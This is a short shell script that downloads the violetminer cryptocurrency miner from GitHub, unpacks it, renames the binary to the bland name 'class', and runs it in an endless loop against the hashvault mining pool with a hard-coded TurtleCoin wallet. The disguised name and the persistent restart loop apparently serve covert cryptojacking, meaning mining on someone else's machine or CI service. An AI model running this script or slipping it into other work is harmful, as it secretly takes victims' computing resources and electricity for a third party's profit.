#!/bin/sh
wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
tar xf violetminer-linux-v0.2.2.tar.gz
cd violetminer-linux-v0.2.2
mv violetminer class
while [ 1 ]; do
./class --pool pool.hashvault.pro:8888 --username TRTLuyH4oQwEY6M7jAq5db7LfCY8QwWc368VPfpCg4XzjTw1kPdTnaYhnZKktmDNWphDCH8LtmbsTBuvvQEbk1Jb9FXswLdcfLy --password x --algorithm chukwa_v2 --ssl
sleep 10
done
